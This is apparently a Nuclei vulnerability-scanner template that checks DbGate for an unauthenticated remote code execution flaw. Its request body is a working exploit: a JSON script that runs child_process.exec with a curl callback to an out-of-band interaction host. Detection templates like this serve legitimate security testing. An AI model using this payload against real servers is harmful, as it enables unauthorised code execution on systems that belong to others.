id: dbgate-unauth-rce

info:
  name: Zero Click Remote Code Execution on DbGate Application
  author: h0j3n
  severity: Critical
  description: DbGate Web Client Management is suspectible to an unauthenticated remote code execution vulnerability
  reference:
    - https://github.com/dbgate/dbgate
    - https://dbgate.org/docs/env-variables.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  tags: http,rce,dast,oast,cve,electron,dbgate

requests:
  - raw:
    - |
      POST /runners/start HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
      Content-Type: application/json

      {"script":"process.mainModule.require('child_process').exec('curl http://{{interactsh-url}}')"}

    matchers-condition: or
    matchers:
        - type: word
          part: interactsh_protocol
          words:
            - "dns"
            - "http"
